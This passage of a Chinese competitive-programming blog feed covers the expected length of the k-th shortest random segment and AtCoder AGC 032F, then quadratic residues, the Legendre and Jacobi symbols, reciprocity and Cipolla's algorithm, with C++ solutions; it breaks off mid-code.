    <content type="html"><![CDATA[<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>一个长度为 $1$ 的线段上随机撒 $n-1$ 个点，形成了 $n$ 条线段，那么这 $n$ 条线段中第 $k$ 短（$k\leq n$）的线段期望长度是多少呢？答案是：<br>$$<br>\frac 1n \sum_{i=0}^{k-1} \frac 1{n-i}<br>$$<br>例如， $n$ 条线段中最短的线段期望长度是 $\frac 1 {n^2}$，第二短的期望是 $\frac 1n (\frac 1n + \frac 1{n-1})$ ，依此类推。</p><p>事实上，这 $n$ 条线段期望的长度分布是指数分布，可以类比玻尔兹曼分布，少数较长的线段占据了大部分长度。而如果按照从左往右的顺序的话，每条线段长度都服从相同的概率分布，概率密度函数都是 $\displaystyle f(x) = (n-1) \cdot (1-x)^{n-2}$ 。</p><span id="more"></span><p>这里只证明第 $k$ 短的期望。推导过程很大一部分借鉴了<a href="http://www.jlao.net/technology/1419/">这篇博客</a>。当然北航也写过类似的题解：</p><p>[2015-2016 Petrozavodsk Winter Training Camp, Moscow SU Trinity Contest](<a href="http://clatisus.com/2015-2016">http://clatisus.com/2015-2016</a> Petrozavodsk Winter Training Camp, Moscow SU Trinity Contest)</p><p><a href="https://blog.csdn.net/qq_39972971/article/details/88824698">cz_xuyixuan的题解</a></p><p><a href="https://blog.csdn.net/corsica6/article/details/88926902">ccosi的题解</a></p><h1 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h1><p>我们采用数学归纳法的思路。</p><ul><li>当 $k=1$ 时，我们先证明 $n$ 条线段中最短的线段期望长度是 $\frac 1 {n^2}$ 。</li></ul><p>不妨考虑最短长度不小于 $x$ 时的概率如何求解。实际上相当于把每条线段都预留上 $x$ 的长度，剩下的就是一个随机分配的问题了，每条线段都有 $(1-nx)$ 的概率，即：<br>$$<br>P(L_{1} \geq x) = P(L_1\geq x,L_2\geq x,\cdots,L_n\geq x,L_1+L_2+\cdots+L_n=1) = (1-nx)^{n-1}<br>$$<br>求最短线段的期望长度就是这样一个积分：<br>$$<br>\begin{align}<br>E(L_{1}) &amp; = \int_0^{\frac 1n} xP(L_{1} = x) \textrm{d}x\<br>           &amp; = \int_0^{\frac 1n} P(L_{1} \geq x) \textrm{d}x \<br>           &amp; = \int_0^{\frac 1n} (1-nx)^{n-1} \textrm{d}x\<br>           &amp; = \frac 1{n^2}<br>\end{align}<br>$$<br>由此， $k=1$ 的情况得到了证明。</p><ul><li>假设 $k=d$ 的情况，上述结论成立，我们考虑 $k=d+1$ 的情况。</li></ul><p>求第 $d+1$ 短的期望长度，我们只需要先把最短的一段截走，之后就是对于 $n-1$ 条线段的第 $d$ 短的问题了。<br>$$<br>\begin{align}<br>E(L_{d+1}) &amp; = E(L_1)+(1-n\cdot E(L_1)) \cdot \frac{1}{n-1}\sum_{i=1}^d\frac 1{n-i} \<br>           &amp; = \frac{1}{n^2} + \frac{1}{n}\sum_{i=1}^d \frac 1{n-i} \<br>           &amp; = \frac 1n \sum_{i=0}^{d}\frac 1{n-i}<br>\end{align}<br>$$<br>由此，命题得证。 </p><h1 id="例题-AGC-032F"><a href="#例题-AGC-032F" class="headerlink" title="例题 AGC 032F"></a>例题 AGC 032F</h1><p>你有一个大小为 $1$ 的圆形比萨，你首先将会切 $n$ 刀，每一刀都是随机一个 $[0,2\pi)$ 的角度 $\theta$，然后从圆心沿着水平方向逆时针 $\theta$ 的角度切下去。$n$ 刀过后，比萨被切成了 $n$ 份。</p><p>之后，你可以选取面积之和最接近 $\frac 13$ 的连续的若干份比萨作为你的食物。问你吃到的比萨大小与 $\frac 13$ 的距离的期望是多少，即 $|x-\frac 13|$ 的期望。</p><p><a href="https://atcoder.jp/contests/agc032/tasks/agc032_f">题目链接</a></p><p>解答：<br>$$<br>ans = \sum_{i=1}^m \frac{1}{3^i \cdot n(n-i+1)}<br>$$</p><p><strong>AC代码</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i, n) for(int i = 1, i##_end_ = (n); i &lt;= i##_end_; ++i)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">pair</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MOD = <span class="number">1000000007</span>, maxn = <span class="number">1020000</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">muln</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123; <span class="keyword">return</span> <span class="number">1LL</span> * x  * y % MOD; &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">qpow</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(; y; y &gt;&gt;= <span class="number">1</span>, x = muln(x, x))</span><br><span class="line">        <span class="keyword">if</span>(y &amp; <span class="number">1</span>) ret = muln(ret, x);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inv</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123; <span class="keyword">return</span> qpow(x, MOD - <span class="number">2</span>); &#125;</span><br><span class="line"><span class="keyword">int</span> n, ans, i3 = inv(<span class="number">3</span>), in, p3 = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    in = inv(n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        p3 = muln(p3, i3);</span><br><span class="line">        ans += muln(p3, muln(in, inv(n - i + <span class="number">1</span>)));</span><br><span class="line">        <span class="keyword">if</span>(ans &gt;= MOD) ans -= MOD; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ans);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;问题描述&quot;&gt;&lt;a href=&quot;#问题描述&quot; class=&quot;headerlink&quot; title=&quot;问题描述&quot;&gt;&lt;/a&gt;问题描述&lt;/h1&gt;&lt;p&gt;一个长度为 $1$ 的线段上随机撒 $n-1$ 个点，形成了 $n$ 条线段，那么这 $n$ 条线段中第 $k$ 短（$k\leq n$）的线段期望长度是多少呢？答案是：&lt;br&gt;$$&lt;br&gt;\frac 1n \sum_{i=0}^{k-1} \frac 1{n-i}&lt;br&gt;$$&lt;br&gt;例如， $n$ 条线段中最短的线段期望长度是 $\frac 1 {n^2}$，第二短的期望是 $\frac 1n (\frac 1n + \frac 1{n-1})$ ，依此类推。&lt;/p&gt;
&lt;p&gt;事实上，这 $n$ 条线段期望的长度分布是指数分布，可以类比玻尔兹曼分布，少数较长的线段占据了大部分长度。而如果按照从左往右的顺序的话，每条线段长度都服从相同的概率分布，概率密度函数都是 $\displaystyle f(x) = (n-1) \cdot (1-x)^{n-2}$ 。&lt;/p&gt;</summary>
    
    
    
    <category term="题解" scheme="http://yangdong2002.github.io/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
    <category term="概率与期望" scheme="http://yangdong2002.github.io/tags/%E6%A6%82%E7%8E%87%E4%B8%8E%E6%9C%9F%E6%9C%9B/"/>
    
  </entry>
  
  <entry>
    <title>数论之旅1：同余方程</title>
    <link href="http://yangdong2002.github.io/2019/03/20/%E6%95%B0%E8%AE%BA%E4%B9%8B%E6%97%85%E4%B9%8B%E5%90%8C%E4%BD%99%E6%96%B9%E7%A8%8B/"/>
    <id>http://yangdong2002.github.io/2019/03/20/%E6%95%B0%E8%AE%BA%E4%B9%8B%E6%97%85%E4%B9%8B%E5%90%8C%E4%BD%99%E6%96%B9%E7%A8%8B/</id>
    <published>2019-03-20T02:13:14.000Z</published>
    <updated>2020-04-20T13:22:19.534Z</updated>
    
    <content type="html"><![CDATA[<p>最近我一直在刷潘承洞、潘承彪的《初等数论》，感觉还是学到了不少东西呢。从现在我就来做一个数论之旅系列专题笔记吧，顺便也记录一下我的学习历程。</p><p>这一次笔记对应的是《初等数论》第四章同余方程 4.5 到 4.9 的内容，主要介绍<strong>二次剩余理论，包括欧拉判别法，勒让德符号，二次互反律，雅克比符号</strong>等，以及高次同余方程简介，给出了 $n$ 次剩余的判别公式。</p><p>在开始之前约定一下我的记号吧。未经说明的任何字母都代表自然数，小写字母 $p$ 始终代表奇素数，而大写的 $P$ 则不一定。</p><span id="more"></span><h1 id="二次剩余"><a href="#二次剩余" class="headerlink" title="二次剩余"></a>二次剩余</h1><h2 id="知识与定理"><a href="#知识与定理" class="headerlink" title="知识与定理"></a>知识与定理</h2><p>首先我们最初是想要解决二次同余方程 $ax^2+bx+c\equiv 0\pmod p$ 。我们经过配方等操作之后，可以发现这种方程化简之后唯一不平凡的形式就是 $x^2\equiv d \pmod p$ 这个样子。这个形式看似简单，不就是模意义下开根号么，可是里面藏着不少玄机。我们先给出一些定义：</p><p>模素数的二次剩余、二次非剩余的定义：</p><ul><li>若关于 $x$ 的同余方程 $x^2\equiv d \pmod p$ 有解（$p\nmid d$），则称 $d$ 是模 $p$ 的二次剩余；</li><li>否则，称 $d$ 是模 $p$ 的二次非剩余。</li></ul><p>注意：我们一般不谈 $\pmod 2$  的二次剩余，也不谈 $0$ 是不是二次剩余。</p><p>显然，$\pmod p$ 的二次剩余一共有 $\frac{p-1}{2}$ 个，且方程 $x^2\equiv d \pmod p$ 要么无解，要么恰好有两个解。</p><h3 id="欧拉判别法"><a href="#欧拉判别法" class="headerlink" title="欧拉判别法"></a>欧拉判别法</h3><blockquote><p>设素数 $p&gt;2, p\nmid d$ ，那么，$d$ 是模 $p$ 的二次剩余的充分必要条件是：<br>$$<br>d^{(p-1)/2} \equiv 1 \pmod p<br>$$<br>$d$ 是模 $p$ 的二次非剩余的充分必要条件是：<br>$$<br>d^{(p-1)/2} \equiv -1 \pmod p<br>$$</p></blockquote><p>这个定理是一个比较重要的定理，我们可以轻易在 $O(\log p)$ 的时间内计算出一个数是不是二次剩余，而在大部分ACM竞赛中对于二次剩余也只需要了解这么多。这个地方我暂时不给出证明，以后提到的原根之后，我们将给出一种统一的证明方式，这种证法同时能证明之后提到的 $n$ 次剩余的结论。</p><p>由欧拉判别法，根据其只有-1，1这两种取值特点，结合乘方的性质，我们可以很轻易地发现下面的性质：</p><ul><li>二次剩余 $\times$ 二次剩余 = 二次剩余</li><li>二次剩余 $\times$ 二次非剩余 = 二次非剩余</li><li>二次非剩余 $\times$ 二次非剩余 = 二次剩余</li></ul><p>模 $p$ 意义下，这种二次剩余的关系满足一种积性性质！那么，我们就引入一种一种完全积性函数来表示二次剩余吧，由此勒让德符号应运而生。</p><h3 id="勒让德符号"><a href="#勒让德符号" class="headerlink" title="勒让德符号"></a>勒让德符号</h3><blockquote><p>定义整变量 $d$ 的函数（ $p$ 是素数）<br>$$<br>\left(\frac{d}{p}\right) =<br>\begin{cases}<br>1 &amp; \text{d是模p的二次剩余} \<br>-1 &amp; \text{d是模p的二次非剩余}\<br>0 &amp; p\mid d<br>\end{cases}<br>$$<br>我们把 $\left(\frac{d}{p}\right)$ 称为模 $p$ 的勒让德符号。</p></blockquote><p>勒让德符号满足下面的性质:</p><ul><li>$\left(\frac dp \right) = \left( \frac{p+d}{p}\right)$ ；即：勒让德符号有周期性。</li><li>$\left(\frac{d}{p}\right) \equiv d^{(p-1)/2} \pmod p$ 这是因为欧拉判别法</li><li>$\left(\frac{dc}{p}\right) = \left(\frac{d}{p}\right) \left(\frac{c}{p}\right)$</li></ul><p>有了第一、第三点，我们称勒让德符号是模 $p$ 的Dirichlet特征，勒让德符号因此具有良好的性质；而有了第二点，我们可以方便地使用快速幂来计算勒让德符号。</p><p>二次剩余这么就完全解决了吗？从理论上讲，还有很多非常优美的性质没有挖掘呢！下面我们就引出初等数论最重要的成果之一：高斯的二次互反律。首先我们介绍高斯引理：</p><h3 id="高斯引理"><a href="#高斯引理" class="headerlink" title="高斯引理"></a>高斯引理</h3><blockquote><p>设 $p \nmid d$；再设 $1\leq j \leq (p-1)/2$，令<br>$$<br>t_i \equiv jd \pmod p,\text{  } 0 &lt; t_j &lt; p<br>$$<br>以 $n$ 表示这 $(p-1)/2$ 个 $t_i$ 中大于 $p/2$ 的数的个数，那么：<br>$$<br>\left(\frac{d}{p}\right) = (-1)^n<br>$$<br>事实上，当 $\gcd(d,2p)=1$ 时，我们还有 $n$ 的精确表达式：<br>$$<br>n = \sum_{i=1}^{(p-1)/2} \left[\frac{jd}{p}\right]<br>$$</p></blockquote><p>这个定理还是蛮有用的，有了高斯引理，我们就可以解决一部分勒让德符号计算的问题了：（读者可以自己验证）</p><ul><li>$\left( \frac{1}{p} \right) \equiv 1$ 这个根据定义显然；</li><li>$\left( \frac{-1}{p} \right) \equiv (-1)^{\frac{p-1}{2}}$  根据定义显然，$4k+1$ 型素数-1是二次剩余；</li><li>$\left( \frac{2}{p} \right) \equiv (-1)^{\frac{p^2-1}{8}}$ 用高斯引理易得。这说明对于 $8k\pm 1$ 型素数 $2$ 是二次剩余；</li></ul><p>那么如何证明呢？高斯引理的证明是挺精妙的，我们只证明前一半部分。我们考虑 $t_i$ 的乘积，一方面：<br>$$<br>\prod_{i=1}^{(p-1)/2} t_i = d^{(p-1)/2} \prod_{i=1}^{(p-1)/2} i<br>$$<br>另一方面，把 $t_i$ 中所有大于 $(p-1)/2$ 的数 $r$ 换成 $p - r$ ，即可使这些 $t_i$ 形成 $1,2,\cdots,(p-1)/2$ 的一个排列，这个过程中一共有 $n$ 个数被调换，因此乘积中会出现 $(-1)^n$ 的因子。由此：<br>$$<br>\prod_{i=1}^{(p-1)/2} t_i = (-1)^n \prod_{i=1}^{(p-1)/2} i<br>$$<br>综合上面两个式子，即可得到这个定理。</p><p>如果稍微进行一些分析，就可以得到 $n$ 的表达形式了，这里不再展开。可是我们能够注意到， $n$ 的形式不是类欧几里得算法的形式么？我们自然要考虑它的几何意义。如下图，这个值就是阴影三角形 $\triangle OCB$ 内部格点的数目。为什么说是内部呢？很好证明，这个三角形斜边上不会出现格点。</p><p><img src="gauss.png" alt="Gauss引理的几何意义"></p><h3 id="二次互反律"><a href="#二次互反律" class="headerlink" title="二次互反律"></a>二次互反律</h3><p>在上面的图片里面，我们不禁要问还有没有别的几何意义。我们观察 $\triangle OCB$ ，这个三角形就是 $\left(\frac{p}{d}\right)$ 啊！（注意我们之前约定过 $d$ 是奇数）。那么这两个三角形的格点数目之和正好就是整个矩形的格点数目 $\frac{p-1}{2} \cdot \frac{d-1}{2}$ ！由此我们就证明了二次互反律：</p><blockquote><p>设 $p,q$ 为奇素数，$p\neq q$ ，则有：<br>$$<br>\left(\frac qp\right) \cdot \left( \frac pq \right)  = (-1)^{\frac{p-1}{2} \cdot \frac{q-1}{2}}<br>$$</p></blockquote><p>二次互反律的理论价值和实用价值都很高，可以证明很多命题，下面举几个《初等数论》上的例题吧，读者可以想一想怎么解决，之后可能会更新解答。</p><ul><li>证明有无穷多个 $8k+1$ 型质数</li><li>求以 $11$ 为其二次剩余的所有奇素数 $p$</li><li>证明：若$\left(\frac dp\right) = -1$ ，则 $p$ 必然不能表示为 $x^2-dy^2$  的形式。</li></ul><p>我们再说一说二次互反律的另一个重要价值——计算勒让德符号。有了二次互反律，我们可以设计一种类欧几里得算法！回想我们是如何使用欧几里得算法求最大公约数的：</p><ul><li>我们知道 $\gcd(a,0)=a$ 这一种平凡情况</li><li>否则，利用 $\gcd(a,b) = \gcd(b,a%b)$ ，我们可以将问题规模缩小一半，从而让问题可以化为平凡情况</li></ul><p>对于勒让德符号的计算，我们不也可以这样吗？我们有这么几个条件：</p><ul><li>当勒让德符号上面的数 $d=1,2 \text{ or } -1$  时，可以直接给出答案；</li><li>否则，根据互反律，我们可以交换上下两个数，$O(1)$ 计算那个多出来的 $(-1)^{\frac {p-1}{2} \cdot \frac{q-1}2}$ 因子，然后用Legendre符号的周期性进行取模，使得问题规模缩小一半。</li></ul><p>这不是挺完美的吗？别高兴得太早！别忘记，勒让德符号要求符号下面的数 $p$ 可要是质数！正因为这一点，互反律成立需要 $p,q$ 是奇素数才可以！这样才能保证勒让德符号有意义！这可麻烦了，这样的话，就是计算个勒让德符号，还要必须将数分解质因数！分解质因数可不是个简单的事情，当数比较大的时候这个开销是花不起的。那么我们怎么办呢？我们可以拓展勒让德符号的定义，我们来定义雅克比符号：</p><h3 id="雅克比符号"><a href="#雅克比符号" class="headerlink" title="雅克比符号"></a>雅克比符号</h3><blockquote><p>设奇数 $P&gt;1$，$P=p_1p_2\cdots p_s$ ，则定义雅克比符号为：<br>$$<br>\left( \frac dP \right) = \prod_{i-1}^{s} \left(\frac d{p_i}\right)<br>$$<br>其中乘积项中的符号是勒让德符号。</p></blockquote><p>可以验证，雅克比符号满足勒让德符号的一切性质，并且满足互反律，因此可以辅助计算勒让德符号。</p><p>可是有一点必须强调：雅克比符号 $\left( \frac dP \right)=1$ 绝不保证 $x^2\equiv d \pmod P$ 一定有解！例如：$\left(\frac 2 {3599}\right) = 1$ ，可是 $x^2\equiv 2 \pmod {3599}$ 无解！ </p><p>其实雅可比符号还有拓展，叫做Kronecker符号，甚至还可以拓展到有理数范围，叫做Hilbert符号。这里给出维基百科的链接吧 <a href="https://en.wikipedia.org/wiki/Legendre_symbol">Legendre</a>，此处不再详细说明了。（<del>其实是因为我也不会</del>）</p><p>下面是一个雅克比符号的模板。使用二次互反律计算，复杂度 $O(\log \min {a,n})$ 。Accepted on <a href="https://cn.vjudge.net/problem/HDU-3589">HDU3589</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Jacobi</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    a %= n;</span><br><span class="line">    <span class="keyword">if</span>(a == <span class="number">0</span> || (a%<span class="number">2</span>==<span class="number">0</span> &amp;&amp; n%<span class="number">2</span>==<span class="number">0</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(a == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(a == <span class="number">2</span>) <span class="keyword">return</span> (((n&amp;<span class="number">7</span>) == <span class="number">1</span>) || ((n&amp;<span class="number">7</span>) == <span class="number">7</span>)) ? <span class="number">1</span> : <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>((a &amp; <span class="number">1</span>) == <span class="number">0</span>) <span class="keyword">return</span> Jacobi(<span class="number">2</span>, n) * Jacobi(a / <span class="number">2</span>, n);</span><br><span class="line">    <span class="keyword">if</span>(n % <span class="number">2</span> == <span class="number">0</span>) <span class="keyword">return</span> Jacobi(a, <span class="number">2</span>) * Jacobi(a, n / <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> sgn = ((a - <span class="number">1</span>) / <span class="number">2</span> * (n - <span class="number">1</span>) / <span class="number">2</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> Jacobi(n, a) * (sgn ? <span class="number">-1</span> : <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Cipolla算法"><a href="#Cipolla算法" class="headerlink" title="Cipolla算法"></a>Cipolla算法</h2><p>上面主要是在讲如何判断二次剩余存不存在的问题，可是如果知道存在了，到底应当怎样构造呢？Cipolla算法即可解决这个问题。这个算法感觉数学背景还是蛮深厚的，是一个挺有趣的算法。</p><p>推荐博客 <a href="https://blog.csdn.net/a_crazy_czy/article/details/51959546">czy</a> ，下面内容是从他的博客上抄的。</p><p><img src="c1.jpg" alt="czy1"></p><p><img src="c2.png" alt="czy2"></p><p><img src="c3.png" alt="czy3"></p><p>模板题： <a href="http://acm.timus.ru/problem.aspx?space=1&num=1132">Timus 1132</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Type int</span></span><br><span class="line"><span class="keyword">namespace</span> ModOp &#123;</span><br><span class="line">    Type MOD;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> Type <span class="title">mo</span><span class="params">(Type x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x &gt;= MOD) x -= MOD;</span><br><span class="line">        <span class="keyword">if</span>(x &lt; <span class="number">0</span>) x += MOD;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">MF</span> &#123;</span></span><br><span class="line">        Type v;</span><br><span class="line">        MF(Type x = <span class="number">0</span>): v(mo(x)) &#123; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">operator</span> <span class="title">Type</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> v; &#125;</span><br><span class="line">        MF <span class="keyword">operator</span> + (<span class="keyword">const</span> MF&amp; f) <span class="keyword">const</span> &#123; <span class="keyword">return</span> mo(v + f.v); &#125;</span><br><span class="line">        MF <span class="keyword">operator</span> - (<span class="keyword">const</span> MF&amp; f) <span class="keyword">const</span> &#123; <span class="keyword">return</span> mo(v - f.v); &#125;</span><br><span class="line">        MF <span class="keyword">operator</span> * (<span class="keyword">const</span> MF&amp; f) <span class="keyword">const</span> &#123; <span class="keyword">return</span> <span class="number">1LL</span> * v * f.v % MOD; &#125;</span><br><span class="line">        MF <span class="keyword">operator</span> / (<span class="keyword">const</span> MF&amp; f) <span class="keyword">const</span> &#123; <span class="keyword">return</span> v / f.v; &#125;</span><br><span class="line">        MF <span class="keyword">operator</span> - () <span class="keyword">const</span> &#123; <span class="keyword">return</span> MOD - v; &#125;</span><br><span class="line">        MF <span class="keyword">operator</span> &gt;&gt; (<span class="keyword">int</span> idx) <span class="keyword">const</span> &#123; <span class="keyword">return</span> v &gt;&gt; idx; &#125;</span><br><span class="line">        MF <span class="keyword">operator</span> &lt;&lt; (<span class="keyword">int</span> idx) <span class="keyword">const</span> &#123; <span class="keyword">return</span> v &lt;&lt; idx; &#125;</span><br><span class="line">        <span class="keyword">bool</span> <span class="keyword">operator</span> == (<span class="keyword">const</span> MF&amp; f) <span class="keyword">const</span> &#123; <span class="keyword">return</span> v == f.v; &#125;</span><br><span class="line">        <span class="keyword">bool</span> <span class="keyword">operator</span> != (<span class="keyword">const</span> MF&amp; f) <span class="keyword">const</span> &#123; <span class="keyword">return</span> v != f.v; &#125;</span><br><span class="line">        <span class="keyword">bool</span> <span class="keyword">operator</span> &gt; (<span class="keyword">const</span> MF&amp; f) <span class="keyword">const</span> &#123; <span class="keyword">return</span> v &gt; f.v; &#125;</span><br><span class="line">        <span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> MF&amp; f) <span class="keyword">const</span> &#123; <span class="keyword">return</span> v &lt; f.v; &#125;</span><br><span class="line">        <span class="keyword">bool</span> <span class="keyword">operator</span> &gt;= (<span class="keyword">const</span> MF&amp; f) <span class="keyword">const</span> &#123; <span class="keyword">return</span> v &gt;= f.v; &#125;</span><br><span class="line">        <span class="keyword">bool</span> <span class="keyword">operator</span> &lt;= (<span class="keyword">const</span> MF&amp; f) <span class="keyword">const</span> &#123; <span class="keyword">return</span> v &lt;= f.v; &#125;</span><br><span class="line">        <span class="keyword">friend</span> ostream&amp; <span class="keyword">operator</span> &lt;&lt; (ostream&amp; out, MF f) &#123; <span class="keyword">return</span> out &lt;&lt; f.v; &#125;</span><br><span class="line">        <span class="keyword">friend</span> istream&amp; <span class="keyword">operator</span> &gt;&gt; (istream&amp; in, MF f) &#123; <span class="keyword">return</span> in &gt;&gt; f.v; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">bool</span> <span class="title">scan</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v) != <span class="number">-1</span>; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, v); &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> Type</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt; T <span class="title">qpow</span><span class="params">(T x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    T ret = T(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(; y; y &gt;&gt;= <span class="number">1</span>, x = x * x)</span><br><span class="line">        <span class="keyword">if</span>(y &amp; <span class="number">1</span>) ret = ret * x;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">using</span> ModOp::MF;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> qres &#123;</span><br><span class="line">    MF a, n;</span><br><span class="line">    <span class="keyword">int</span> p;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">F</span> &#123;</span></span><br><span class="line">        MF x, y; <span class="comment">// x+yw</span></span><br><span class="line">        F(MF _a = <span class="number">0</span>, MF _b = <span class="number">0</span>): x(_a), y(_b) &#123; &#125;</span><br><span class="line">        F <span class="keyword">operator</span> + (F f2) <span class="keyword">const</span> &#123; <span class="keyword">return</span> F(x + f2.x, y + f2.y); &#125;</span><br><span class="line">        F <span class="keyword">operator</span> * (F f2) <span class="keyword">const</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> F(x*f2.x + y*f2.y*(a*a-n), x*f2.y+y*f2.x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function">MF <span class="title">Legendre</span><span class="params">(MF d)</span> </span>&#123; <span class="keyword">return</span> qpow(d, (p<span class="number">-1</span>)/<span class="number">2</span>); &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Cipolla</span><span class="params">(<span class="keyword">int</span> qn, <span class="keyword">int</span> qp)</span> </span>&#123; <span class="comment">// p is a prime, gcd(n, p) = 1</span></span><br><span class="line">        qn %= qp;</span><br><span class="line">        <span class="keyword">if</span>(qp == <span class="number">2</span> &amp;&amp; qn == <span class="number">1</span>) &#123; <span class="built_in">puts</span>(<span class="string">&quot;1&quot;</span>); <span class="keyword">return</span>; &#125;</span><br><span class="line">        ModOp::MOD = p = qp; n = qn;</span><br><span class="line">        <span 